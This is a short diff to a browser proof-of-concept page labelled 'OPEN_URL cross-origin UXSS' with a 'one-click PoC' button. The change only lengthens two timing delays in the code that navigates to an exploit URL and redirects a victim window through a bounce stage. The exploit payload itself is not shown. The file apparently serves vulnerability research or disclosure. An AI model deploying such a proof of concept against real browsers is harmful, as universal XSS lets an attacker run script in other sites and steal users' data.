@@ -23,7 +23,7 @@
       setTimeout(() => {
         location.href = exploit;
         history.back();
-      }, 100);
+      }, 1000);
     } else {
       app.innerHTML = '<h1>OPEN_URL cross-origin UXSS</h1><button id="run" type="button">RUN ONE-CLICK POC</button><pre id="status"></pre>';
       document.querySelector('#run').onclick = () => {
@@ -35,7 +35,7 @@
         bounce.search = '';
         bounce.searchParams.set('stage', 'bounce');
         bounce.searchParams.set('t', String(Date.now()));
-        setTimeout(() => { victim.location.href = bounce.href; }, 500);
+        setTimeout(() => { victim.location.href = bounce.href; }, 5000);
       };
     }
   </script>
